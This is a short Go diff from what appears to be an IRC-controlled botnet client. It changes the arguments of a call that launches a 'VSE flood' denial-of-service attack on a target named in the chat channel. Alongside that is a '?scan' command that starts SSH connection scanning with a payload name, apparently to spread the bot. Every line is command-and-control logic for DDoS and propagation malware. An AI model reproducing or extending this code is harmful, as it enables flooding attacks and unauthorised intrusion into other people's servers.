@@ -81,7 +81,7 @@ func main() {
 				pkg.DDoS_Switch = false
 				pkg.IRC_Report(irc, IRC_Channel, "START VSE FLOOD TO: "+
 					pkg.IRC_Recv(ircRead, 4))
-				pkg.VSE(pkg.IRC_Recv(ircRead, 4), pkg.IRC_Recv(ircRead, 5), IRC_Channel, irc)
+				pkg.VSE(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
 			} else if pkg.IRC_Find(ircRead, "?scan") {
 				pkg.IRC_Report(irc, IRC_Channel, "START SCANNING.")
 				pkg.SSH_Conn(irc, pkg.IRC_Recv(ircRead, 4), IRC_Channel, New_Payload_Name)
